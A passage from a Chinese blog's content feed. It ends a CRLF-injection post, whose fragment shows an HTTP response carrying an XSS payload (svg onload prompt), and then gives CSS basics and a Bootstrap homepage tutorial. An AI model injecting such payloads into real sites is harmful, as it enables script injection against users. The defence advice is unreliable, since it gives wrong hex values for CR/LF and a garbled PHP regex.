200 ok Date: XXX Content-Type: text/html Content-Length: 154 Connection: close &lt;svg/onload=prompt(1)&gt; 从而形成XSS漏洞 0x04 防御 您需要限制用户输入CR（0x13）和LF（为0x10）或正确编码的输出，以防止自定义HTTP标头注射。 通过在PHP脚本中嵌入如下指令，确保所有这种类型的URL变量在使用时已被清空： $var = preg_replace(’///s+/’, ’, $var); 如果你的脚本不需要访问URLs，建议在php.ini中关闭allow_url_fopen]]></content>
      <tags>
        <tag>CRLF</tag>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端开发基础知识]]></title>
    <url>%2F2016%2F08%2F29%2F%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[CSS盒子模型网页设计中常听的属性名：内容(content)、填充(padding)、边框(border)、边界(margin)， CSS盒子模式都具备这些属性。 元素实际占用尺寸 = width(height) + padding + border + margin 选择器CSS1 定义的选择器 元素选择器：E ID选择器：#id 类选择器：E.class 包含选择器：E F 伪类选择器：E:link、E:visited、E:active、E:hover、E:focus 伪元素：E:first-link、E:first-letter CSS2.1 增加的选择器 通配选择器：* (星号) 伪类选择器：E:lang(fr) 子包含选择器：E &gt; F 相邻兄弟选择器：E + F 伪元素：E:before、E:after 属性选择器：E[foo]、E[foo=”bar”]、E[foo~=”bar”]、E[foo|=”bar”] 优先级 ※同级后来居上 例如： HTML代码： &lt;ul class=&quot;list&quot;&gt; &lt;li&gt;one&lt;/li&gt; &lt;li&gt;two&lt;/li&gt; &lt;li&gt;three&lt;/li&gt; &lt;/ul&gt; CSS代码： ul li{color:#000;} 1 + 1 =2 .list li{color:#f00;} 10 + 1 =11 .list li 的优先级更高，所以浏览器会显示 .list li 设置的样式 其实说白了，就是后面的会把前面的覆盖掉，内敛的会把link的覆盖掉，然后再整合。 布局浮动 (float) none：不浮动（默认值） left：左浮动 right：右浮动 解释： 浮动什么意思呢，比如，默认的，我们知道，div是占满一行的，现在我们想把两个div显示在一行上，那怎么办呢 &lt;div style=&quot;width:100px;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt; 这样我们就设置了两个div，一个宽度100px,一个宽150px,可预览一下，我们的div仍在两行上，那么怎么把它改到一行上呢，这儿就需要float，设置第一个div的float为left &lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt; 再预览，就可以看到，它们到一行上了。 clear是什么意思呢，clear是清除的意思，它有三个值，left,right,both 很好理解，如果设置了clear:left，它就不怕它的左边有float，同理clear:right,clear:both，是左右都不让有float 举个例子，还是上面的 我们设置第二个div的clear:left,也就是不让它左边有float &lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px;clear:left;&quot;&gt;2222&lt;/div&gt; 我们预览一下，就可以看到，尽管第一个div已经float:left了，这两个div仍然在两行上，就是由于第二个div不让它左边有float 因为css的定义是后面的可以覆盖前面的，明白了吧 清浮动-clear-bothHTML代码： &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; CSS代码： .layout{} .left{float:left} .right{float:right} .clear{clear:both} 清浮动-overflow:hiddenHTML代码： &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;/div&gt; CSS代码： .layout{overflow:hidden;zoom:1;} .left{float:left} .right{float:right} 定位 (position) static-没有定位（默认值） relative-相对定位 absolute-绝对定位 fixed-固定定位 层级 层级 (z-index) - 后来居上 层级 (z-index) - 定位元素高于非定位元素 层级 (z-index) - 同为定位元素则比较 z-index 隐藏与显示 隐藏元素：display:none;visibility:hidden; 显示元素：display:block;visibility:visible; ※ “display” 在 块级元素&amp;行内元素 中再详细介绍 CSS Resethtml,body,div,ul,ol,li,dl,dt,dd,h1,h2,h3,h4,h5,h6,p,table,th,td,fieldset, form,input,button,textarea,hr,blockquote,pre{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{font-size:100%; font-weight:bold;line-height:1em;} ul,ol,dl{list-style-type:none;} fieldset,img{border:none;} table{border-collapse:collapse;table-layout:fixed;empty-cells:show;} address,caption,cite,code,dfn,th{font-style:normal;font-weight:normal;} ins{text-decoration:underline;} del{text-decoration:line-through;} q:before,q:after{content:&quot;&quot;;} 注意事项： 不要使用 *{margin:0;padding:0;} 最2B的 Reset： div{float:left;} CSS 优化属性简写-外边距margin:10px 15px 20px 25px; 下 上 右 左 顺时针方向 margin:10px; 上下左右统一设置 margin:10px 15px; 上下 左右 属性简写-内边距padding:10px 15px 20px 25px; 下 上 右 左 简写方式与 margin 相同 属性简写-背景background:#ff0000 url(bg.jpg) no-repeat fixed top center; 颜色 图像 平铺方式 滚动方式 图像开始位置 可以省略部分值 background:#f00; background:url(bg.jpg) no-repeat; 属性简写-边框border:1px solid #ff0000; 宽度 样式 颜色 可以省略部分值 border:solid #f00; border:1px solid; 属性简写-字体font:italic bold 15px/20px &quot;微软雅黑&quot; 斜体 粗体 字号/行高 字体名称 字号与字体名称是必须的，其他值可省略 font:15px “微软雅黑”; 注意事项： 简写中省略不写的属性，将使用默认值，而不是继承。 属性继承文本相关的样式会继承 列表相关的样式会继承 颜色属性会继承 选择器优化从右到左的解析顺序 body ul li a {color:#f00;} 4 3 2 1 选择器的效率 ※在一些 JavaScript 库中的选择器，也适用于该效率。（例如：jQuery） 属性继承，减少选择器 .box { padding:10px; } .box p { color:#333; } 简化为： .box { padding:10px ; color:#333; } 书写顺序显示属性 自身属性 文本属性 display top color visibility left font overflow width line-height position height text-align float margin text-decoration clear padding text-indent border text-transform outline vertical-align background white-space content 标签&amp;语义 块元素&amp;行内元素块元素 (block) div p h1~h6 ul ol li dl dt dd table form … 行内元素 (inline) span a img em strong select input textarea … 行内元素无法设置一些CSS属性，例如： width, height, margin-top, margin-bottom, padding-top padding-bottom, text-index … ※可以使用 display 来改变 display 常用属性 完整属性查阅：http://www.w3school.com.cn/css/pr_class_display.asp inline 设置为行内元素 block 设置为块元素 inline-block 设置为行内块元素* none 元素不会被显示 嵌套规则 块元素内能包含所有行内元素 行内元素不能包含块元素 以下块元素中不能包含块元素 h1~h6, p, dt, address HTML5 简单应用DocType &lt;!DOCTYPE HTML&gt; 字符集 &lt;meta charset=&quot;utf-8&quot;&gt; 外链 css 文件 &lt;link rel=&quot;stylesheet&quot; href=“filename.css&quot;&gt; 外链 javascript 文件 &lt;script src=“filename.js&quot;&gt;&lt;/script&gt;]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BootStrap学习笔记]]></title>
    <url>%2F2016%2F08%2F29%2FBootStrap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[BootStrap是什么BootStrap是基于HTML、CSS和JavaScript的框架，使你只需要写简单的代码就可以很快的搭建一个还不错的前端界面，它是后端程序员的福音，使他们只需要专注业务逻辑，而无须浪费太多的精力在界面设计上。 全响应 它可以开发全响应式网页——不论你使用手机、平板电脑、普通个人电脑浏览网站内容，所有的元素都可以很优雅的呈现，减轻了因为兼容性而带来的工作量。 版本 它的最新版本是4.0，国内目前用的较多的是3.x,本教程也基于BootStrap3.x版本。 二次开发 你可以使用默认的BootStrap样式、组件和插件，你也可以对其进行二次开发，甚至你还可以基于BootStrap环境使用自己开发的组件。 你可以登陆http://v3.bootcss.com点击页面中的下载BootStrap按钮下载完整版。 1.首先把它的文件按照类别放在项目的文件夹中 你可以把CSS文件——bootstrap.min.css放在类似stylesheets这样专门放CSS的文件夹。把js文件——bootstrap.min.js放在类似Scripts文件夹中。当然，最终如何部署可以按照你的个人喜好。 2.在页面中使用BootStrap 将BootStrap的文件bootstrap.min.css、bootstrap.min.js引入当前页面中，由于BootStrap是基于Jquery的，所以在引入它的js文件之前，一定要先引入Jquery.js。注意：这里考虑到文件大小，我们引入了min版的文件，当然，你也可以引入完整版的文件。 示例代码如下： &lt;!-- Bootstrap 核心 CSS 文件 --&gt;&lt;/p&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/bootstrap.min.css&quot;&gt; &lt;!-- jQuery文件 --&gt; &lt;script src=&quot;/scripts/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Bootstrap 核心 JavaScript 文件 --&gt; &lt;p&gt;&lt;script src=&quot;/scripts/bootstrap.min.js&quot;&gt;&lt;/script&gt; BootStrap栅格布局BootStrap栅格布局是灵活使用BootStrap的基础。BootStrap将屏幕分为12等分，在具体的DIV中，可以通过设置DIV的所占等分的数字确定其在屏幕中占有的宽度。如： &lt;div class=&quot;row“&gt;&lt;!--表示另起一行--&gt; &lt;div class=&quot;col-md-8&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;col-md-4&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt; &lt;/div&gt; 在第一个DIV中class=&quot;col-md-8&quot;,第二个DIV中class=&quot;col-md-4&quot;, 其中‘8’和‘4’就是其DIV所占屏幕宽度的数值，加在一起等于‘12’。也就是第一个DIV占整个屏幕宽度的‘8/12’,第二个DIV占‘4/12’。 注：在上述代码中为了突显区块，我们设置了DIV的边框宽度为1像素黑色实线，高度设为100像素。 布局屏幕分类BootStrap是一种全响应的技术，那么针对不同的屏幕，它是怎么提供支持的呢？ 别担心，针对不同的显示屏幕尺寸，BootStrap提供了不同的栅格布局的属性： col-xs-* 超小屏幕 手机 (&lt;768px) col-sm-* 小屏幕 平板 (≥768px) col-md-* 中等屏幕 桌面显示器 (≥992px) col-lg-* 大屏幕 大桌面显示器 (≥1200px) 多个布局属性如果想让一个DIV在不同的屏幕中占有不同的屏宽该怎么做呢？ BootStrap允许我们在一个DIV中写多个类别的布局属性，从而让该DIV在不同的屏幕中呈现不同的屏宽。如： &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-8 col-xs-6 col-lg-4&quot;&gt;&lt;/div&gt; &lt;/div&gt; 该DIV在中等屏幕中占有‘8/12’，在手机中占有‘6/12’，在大屏幕中占有屏幕比例的‘4/12’。 网站首页整体设计思路整体架构一般而言首页设计几乎等同与整个网站设计，那么首页中到底应该放些什么内容才好呢？这要看网站有哪些主要的元素。本教程里要设计的网站首页是一个多用户博客类的网站首页，在该网站中用户可以发表博客，也可以推荐图书给其他用户。所以，首页中的板块包括这些应该是恰当的： 整站导航条 文章（博客）展示板块 图书展示板块 用户（会员）展示板块 脚注——footer部分 其中导航条和脚注是整个网站中都要用到的，具体实现时可以放在布局模板中。 板块划分根据上面的整体架构，我们将首页的板块分为以下几个： 1.文章板块——将最新、最热的文章以标签页（tab）切换方式放在该模块中，为了页面美观，将有图片的文章的第一章图片放在轮换图片（caoursel）插件中,最右侧放置热门文章分类。 2.图书板块——按照图书的分类将图书放在首页中，点击不同的分类切换到不同的选项卡。图书展示使用自己开发的Jquery Tab插件，并将其整合到BootStrap环境中。最右侧同样是图书的分类。 3.用户板块——将新加入的用户和对社区贡献最多的用户放在首页中 要用到的BootStrap元素那么，我么要用到哪些BootStrap元素才能很好的展示我们的板块内容呢？ 1.导航条 这里要用到固定在网页头部的导航条（navbar-fixed-top）,并在其中整合用户登录模块，代码如下 &lt;div class=&quot;navbar navbar-inverse navbar-fixed-top&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand active&quot; href=&quot;首页URL&quot;&gt;顶求网&lt;/a&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;图书页面URL&quot;&gt;图书&lt;/a&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;文章页面URL&quot;&gt;文章&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;btn-group&quot; style=&quot;margin-top:10px; float:right;&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-default dropdown-toggle&quot; data-toggle=&quot;dropdown&quot;&gt; 会员登陆 &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot;&gt; &lt;LI&gt;&lt;a href=&quot;会员登陆页面URL&quot; target=&quot;_top&quot;&gt;会员登陆&lt;/a&gt;&lt;/LI&gt; &lt;LI&gt;&lt;a href=&quot;会员注册页面URL&quot; target=&quot;_top&quot;&gt;会员注册&lt;/a&gt;&lt;/LI&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 2.文章板块需要用到的BootStrap元素 1.轮换图片插件（caoursel)——解决了展示图片时图片变形的问题。 2.标签页插件（tabs）——对插件的样式进行了美化，并增加了自动切换功能。 3.信息按钮（btn-info）组件——用它列出文章分类信息。 3.图书板块需要用到的元素 1.自己开发的Jquery Tab插件 2.缩略图(thumbnail)组件 3.分类标签(仿豆瓣) 4.用户板块用到的BootStrap元素 1.BootStrap原生tab 2.圆形图片（image_circle） 文章板块的设计与实现布局怎样的布局才能让网站中的文章以较好的形式呈现在首页上呢？既要反应更新，又要有精华。由于文章板块在首页上处于最上面的部分，所以，考虑使用轮换图片插件来吸引眼球，并且还需要展示最新的文章和热门文章以及文章分类。划分如下： 左部——轮换图片(carousel)和文章列表(tabs)部分，各占一半。 右部——文章分类部分。 左边占据（8/12），右边占据（4/12） 布局代码如下： &lt;!--板块的左部，使用panel，占据8/12--&gt; &lt;div class=&quot;panel panel-default col-md-8&quot;&gt; &lt;!--轮换图片（carousel）插件,占左部的一半--&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;carousel slide&quot; &gt; &lt;/div&gt; &lt;/div&gt; &lt;!--文章tabs，占左部的一半--&gt; &lt;div class=&quot;noborder col-md-6&quot;&gt; &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--板块的右部，使用普通的DIV，占据4/12--&gt; &lt;div class=&quot;col-md-4&quot;&gt; &lt;/div&gt; 使用Carousel（轮换图片）插件首页中使用Carousel插件往往能达到吸睛的目的，是用来展示图文内容的最佳手段。在页面中使用carsouel插件很容易，可以分为以下几个步骤： 1.在DIV的class属性中加入carousel 加入carousel后，该DIV就是一个轮换图片插件了 &lt;div class=&quot;carousel slide&quot; data-ride=&quot;carousel&quot;&gt; &lt;/div&gt; 2.设置内容区（carsouel-inner） 在上述DIV中加入新的DIV作为其主体内容，其class=&quot;carsouel-inner&quot;。 &lt;div class=&quot;carousel-inner&quot; role=&quot;listbox&quot;&gt; &lt;/div&gt; 3.在内容区中放入要展示的元素（item） &lt;div class=&quot;item active&quot;&gt; &lt;a href=&quot;包含图片文章路径&quot;&gt; &lt;img src=&quot;图片路径&quot; alt=&quot;图片信息&quot;/&gt;&lt;/a&gt; &lt;div class=&quot;carousel-caption&quot;&gt; &lt;h4 class=&quot;alpha&quot;&gt; &lt;a style=&quot;color:white;&quot; href=&quot;包含图片文章路径&quot;&gt;图片标题&lt;/a&gt; &lt;/h4&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--其他item--&gt; 可以看到在元素区中包含文章展示信息——文内图片+标题+指向文章的链接。 4.按钮区（carousel-control） 最后放入，“上一个”，“下一个”按钮（左右箭头），用于用户自主切换。 &lt;a class=&quot;left carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;prev&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-chevron-left&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;sr-only&quot;&gt;Previous&lt;/span&gt; &lt;/a&gt; &lt;a class=&quot;right carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;next&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-chevron-right&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;sr-only&quot;&gt;Next&lt;/span&gt; 图片变形 运行右侧的代码中可以看出,当不同长宽比的图片试图占满元素(item)区时，图片发生了变形。 解决展示时图片变形的问题运行上节的代码我们发现插件中的图片发生了变形，分析其原因为：轮换插件中的图片使用的文章中的第一张图片，图片的大小不一，而轮播插件的大小基本是固定的，所以展示的时候图片出现了变形。下面看看怎么解决这个问题： 1.引入Jqthumb.js 在BootStrap中我们找不到解决办法，所以我们需要借助其它工具。Jqthumb插件是专门用来为图片生成缩略图的，它可以从图片中的任何坐标点开始取指定大小的图片区域作为图片的缩略图。你可以点击 https://github.com/pakcheong/jqthumb 来下载它，并将其应用到项目中(假设在当前项目中，jqthumb.js放置在scripts文件夹中): &lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt; 2.在图片加载(onload)的时候调用DrawImage()函数来生成缩略图 DrawImage()函数正是基于jqthumb.js库的，注意该函数一定要写在轮换插件前，因为我们必须在图片加载前生成缩略图。DrawImage()函数代码如下： &lt;!--导入插件--&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt; &lt;script&gt; function DrawImage(hotimg) { $(hotimg).jqthumb({ classname : &apos;jqthumb&apos;, width : &apos;100%&apos;,//宽度 height : &apos;300px&apos;,//高度 position : { y: &apos;50%&apos;, x: &apos;50%&apos;},//从图片的中间开始产生缩略图 zoom : &apos;1&apos;,//缩放比例 method : &apos;auto&apos;,//提交方法，用于不同的浏览器环境，默认为‘auto’ }); } &lt;/script&gt; 在上述代码中，我们使用了jqthumb，并且传入了相关初始化参数。调用了该函数后，在图片加载的时候，就会按照上述参数产生图片的缩略图，从而解决图片变形问题。由于缩略图是从原始图片的正中间开始往两边取得，所以该缩略图包含了图片的主要内容。 针对BootStrap tab的二次开发为什么要进行二次开发 在文章列表部分，我们使用了BootStrap的Tab插件。BootStrap中的tab控件是在一小块区域展示大量信息的首选。但是，它的样式比较单一。而在展示文章列表模块时，我希望它可以更美观，而且选项卡可以自动切换。 使用Tab插件 在页面中使用BootStrap的Tab插件的方法如下： 1.在DIV加入role=”tabpanel” 加入该属性值后，该DIV则变成了tab插件。 &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt; &lt;/div&gt; 2.使用列表制作切换标签 列表项即为切换标签项。 &lt;ul class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot; style=&quot;margin-top:0px;&quot; id=&quot;docTabs&quot;&gt; &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;#Section_new&quot; aria-controls=&quot;home&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot;&gt; 最新&lt;/a&gt;&lt;/li&gt; &lt;!--其余标签卡……--&gt; &lt;/ul&gt; 代码中可以看出，在超级链接元素（a）中有指向该标签页内容的链接地址，如“最新”标签中，href=&quot;#Section_new&quot;,而这个地址一定要跟后面的标签内容页（tab-pane）的ID一一对应。 3.标签内容页区域（tab-content） 所有的标签内容页均放在这个区域。 &lt;div class=&quot;tab-content&quot;&gt; &lt;!--最新--&gt; &lt;!--7天热门--&gt; &lt;!--30天热门--&gt; &lt;/div&gt; 4.单个标签页（tab-pane） tab插件的最小元素，具体的标签内容页。 &lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade in active&quot; id=&quot;Section_new&quot;&gt; &lt;P&gt; tab中的内容 &lt;/P&gt; &lt;/div&gt; &lt;!--其余标签页……--&gt; tab样式美化下面我们来美化一下tab的样式吧，通过CSS代码来设置tab插件的样式，这些样式会覆盖掉bootstrap中的原有样式达到美化tab的效果，主要包括: 标签的形状和背景色 当前(被选中)标签的样式和背景色 标签内容页样式 与小屏幕兼容 //标签样式 .tab .nav-tabs { ……//详见右侧代码 } //标签链接样式 .tab .nav-tabs li a { background: transparent; ……//详见右侧代码 } //当前选中标签样式 .tab .nav-tabs li.active a, .tab .nav-tabs li.active a i { ……//详见右侧代码 } //当前选中标签之后插入的样式 .tab .nav-tabs li.active a:after { ……//详见右侧代码 } //标签内容页样式 .tab .tab-content { ……//详见右侧CSS代码 } //在小屏幕中的样式 @media only screen and (max-width: 480px) { ……//详见右侧代码 } tabs自动切换功能的实现文章列表中列出的最新、7天热门、30天热门这三个选项卡每隔5秒钟自动切换，当鼠标悬停到某选项卡的时候，则暂停轮换，移开后，继续切换。代码设计思路如下： 设置一个定时器timer()，每隔5秒钟对标签页进行切换一次。 在网页加载完以后就运行该定时器。 当用户鼠标悬停到某个标签页上时，清除该（clearInterval）定时器。 鼠标移开后，继续使用定时器。 //tabs自动轮换 function timer(i) { interval=setInterval(function() { $(&quot;#docTabs li:eq(&quot;+i+&quot;) a&quot;).tab(&apos;show&apos;); i++; if(i&gt;2) i=0; } ,5000); return interval; } $(function(){ var i=0; interval=timer(i); //当鼠标悬停在列表区域时暂停轮换 $(“.tab-pane”).mouseover(function(){ clearInterval(interval); }); //鼠标移开时继续轮换 $(“.tab-pane”).mouseout(function(){ timer(i); }); }); 分类展示实现过程 文章分类展示部分采用了BootStrap原生的信息按钮（btn-info）,当鼠标悬停时变色，点击则转向相应的二级页面，代码如下： &lt;div class=&quot;col-md-4&quot; style=&quot;float:right;&quot;&gt; &lt;div&gt; &lt;H5&gt;分 类&lt;/H5&gt; &lt;div style=&quot;font-size:14px;&quot; id=&quot;blogclas&quot;&gt; &lt;a style=&quot;margin-left:5px; margin-bottom:5px;&quot; class=&quot;btn btn-info col-md-3&quot; href=&quot;二级页面地址&quot; role=&quot;button&quot;&gt;分类名&lt;/a&gt; &lt;!--其他分类信息--&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 代码分析 由代码可知，分类区域占有的宽度为（4/12）col-md-4，而其中的单个分类又占有其中的（3/12） col-md-3，也就是每4个分类占一行（实际上由于分类之间要有间隔，只能是3个分类占一行）。 图书板块的设计与实现布局图书板块的布局既要考虑到分类展示图书信息，还需要考虑与前面文章板块的对应，所以，图书板块也分为左右两部分，左边同样使用col-md-8,右边使用col-md-4来划分宽度。当然，如果在其它屏幕有不同的布局需求，你也可以添加上其他的属性值，如col-xs-6（在手机屏幕中占6/12）等。布局代码如下： &lt;div class=&quot;col-md-8&quot; id=&quot;indexbooks&quot;&gt; 首页图书展示区…… &lt;/div&gt; &lt;div class=&quot;col-md-4&quot;&gt; 图书分类展示区…… &lt;/div&gt; 开发Jquery tab为什么要自己写tab 为了更好的在首页图文并茂的展示图书信息以及按类别展示尽可能多的图书，我决定使用Jquery开发自己的tab。下面来看看我的实现过程。 HTML部分 1.标签项 标签仍然使用列表来完成，列表项即为标签项。 &lt;ul id=&quot;booksfilter&quot; style=&quot;float:right;font-size:14px;&quot;&gt; &lt;li&gt;&lt;a class=&quot;cur&quot; href=&quot;javascript:void(0);&quot;&gt;入门&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;实战&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;进阶&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; 其中’a’标签的class=”cur”表示当前被选中的标签。后面再CSS中会设置它的样式。 2.标签页内容区 使用3个DIV,分别存放入门、实战和进阶的图书。 &lt;div class=&quot;booklist&quot;&gt; 入门级图书…… &lt;/div&gt; &lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt; 实战类图书…… &lt;/div&gt; &lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt; 进阶类图书…… &lt;/div&gt; 可以看到，初始时，只有第一个标签页的内容是显示的，而其它两个标签页内容是隐藏（style=&quot;display:none;&quot;）的,后面会利用Jquery来控制他们的切换。 3.使用缩略图（thumbnail）组件展示图书信息 在该组件中包含了图书封面、图书标题、和链接到该图书页面的超级链接。 &lt;div class=&quot;thumbnail&quot; style=&quot;height:220px; border-width:0px;&quot;&gt; &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt; &lt;img style=&quot;height:130px;&quot; src=&quot;http://img3.doubanio.com/mpic/s1039608.jpg&quot;&gt; &lt;/a&gt; &lt;div class=&quot;caption&quot;&gt; &lt;h5 style=&quot;text-align:center;&quot;&gt; &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt; LINUX权威指南（... &lt;/a&gt;&lt;/h5&gt; &lt;p style=&quot;text-align:center;&quot;&gt; 评论(0) &lt;span class=&quot;badge&quot;&gt;1推荐&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; 另外，每本图书所占的宽度为col-md-3,也就是每4本书占据一行。 设计Tab的样式下面我们来设计他的CSS样式，让我们的tabs尽量美观。这些样式主要包括： 标签项样式 标签项中链接的样式 当前被选中标签的样式（cur） //选项卡列表样式 #booksfilter li { padding:5px;//内边距 5px list-style-type:none; float:left; padding:0px; } //设置‘|’的左右边距 #booksfilter span { margin-left:5px; margin-right:5px; } //选项卡链接的样式 #booksfilter a { padding:5px;//内边距：5px text-decoration:none;//无下划线 } //选项卡被选中或当鼠标移动到选项卡时的样式 #booksfilter a.cur,#booksfilter a:hover { background-color:#e67e22;//背景色 color:white;//前景色 border-radius:5px;//圆角 } 代码注释已经很详细了，当然大家也可以修改它来设计出更美的样式。 实现Tab的行为当标签项点击切换的时候，这部分的交互就要交给Jquery代码来完成了。 代码设计思路如下： 遍历所有的标签页，为每个标签页添加点击(click)事件的处理函数 在该处理函数，高亮（使用Jquery在该标签项的class中添加cur）显示当前标签项和其对应的标签页，隐藏其它。 $(function() { $(&apos;#booksfilter a&apos;).each(function(i) {//对每个tabs中的标签添加点击（click）事件的处理函数 $(this).click(function(){ $(this).addClass(&apos;cur&apos;); $(this).parent().siblings().find(&apos;a&apos;).removeClass(&apos;cur&apos;);//删除其他任何选项的cur类 $(&apos;.booklist&apos;).eq(i).show();//显示本节点 $(&apos;.booklist&apos;).eq(i).siblings().hide();//隐藏兄弟节点 }) }); }); 在右侧具体代码中，为了适应屏幕大小，将col-md-3改为了col-xs-3,如果你想使用这个插件的话在你的项目中记得改回去:)。另外，js代码直接放在了HTML的尾部。 仿豆瓣分类标签的实现为了和文章分类部分的样式进行区分，我决定自己动手写一个具有其他样式的分类标签集。刚好看到豆瓣读书板块的首页中的图书分类标签还不错，于是决定自己写一个类似的样式。首先是HTML代码部分： &lt;div class=&quot;col-md-4&quot;&gt; &lt;h5 style=&quot;margin-top:0px;&quot;&gt; 图书分类 &lt;/h5&gt; &lt;div class=&quot;row&quot; id=&quot;bookclass&quot;&gt; &lt;a href=&quot;图书分类页面&quot; class=&quot;col-md-3&quot;&gt;分类名&lt;/a&gt; &lt;!--其他分类--&gt; &lt;/div&gt; &lt;/div&gt; 可以看到图书分类标签很简单——直接使用’a’标签作为分类标签，下面只要针对它写CSS样式就可以了。 //a标签样式 #bookclass a { display:block;//区块显示 background-color:#f5f5f5;//背景色（跟豆瓣相同） text-align:center;//文字居中 padding:2px 5px;//内边距，上下2px，左右5px float:left;//左浮动，从而可以实现水平排列 margin:2px 2px;//外边距，上下2px,左右2px } //当鼠标悬停时改变背景色 #bookclass a:hover { background-color:#e8e8e8;//同豆瓣颜色 } 用户板块的设计与实现布局由于项目开发时间仓促，用户板块没有加入特别的样式美化和行为，而是使用了原生tab。在用户板块中，主要展示最新加入的用户和为博客社区做出最多贡献的用户（高分用户）。布局比较简单，采用整块布局，利用它来展示用户信息。布局主要代码如下： &lt;div class=&quot;panel panel-default&quot;&gt; &lt;!--用户展示区--&gt; &lt;/div&gt; 用户板块的实现用到的BootStrap元素 在用户板块主要用到的BootStrap元素如下： Bootstrap tab——以标签页的方式展示新会员和高分会员 圆形图片区（img-circle）——用于展示用户的头像。 实现过程 用户板块主要使用了BootStrap tab,前面的章节已经介绍过其使用方法。主要包括： 1.在DIV中加入role=”tabpanel”，该DIV则会成为tab &lt;div role=&quot;tabpanel&quot;&gt; &lt;/div&gt; 2.使用列表来制作标签页 &lt;ul id=&quot;myTabregister&quot; class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot;&gt; &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt; &lt;a href=&quot;#newRegister&quot; id=&quot;home-tab&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;home&quot; aria-expanded=&quot;true&quot;&gt;新会员&lt;/a&gt; &lt;/li&gt; &lt;li role=&quot;presentation&quot; class=&quot;&quot;&gt; &lt;a href=&quot;#highScoreRegister&quot; role=&quot;tab&quot; id=&quot;profile-tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;profile&quot; aria-expanded=&quot;false&quot;&gt;高分会员&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; 同样，列表中，超级链接的地址href的值和单个标签内容页的id值一一对应，如最新会员标签项的href=&quot;newRegister&quot;。 3.标签内容区域（tab-content） &lt;div id=&quot;myTabContent&quot; class=&quot;tab-content&quot; style=&quot;text-align:center;&quot;&gt; &lt;!--最新会员展示区--&gt; &lt;!--高分会员展示区--&gt; &lt;/div&gt; 4.单个标签页(tabpanel) &lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade active in&quot; id=&quot;newRegister&quot; 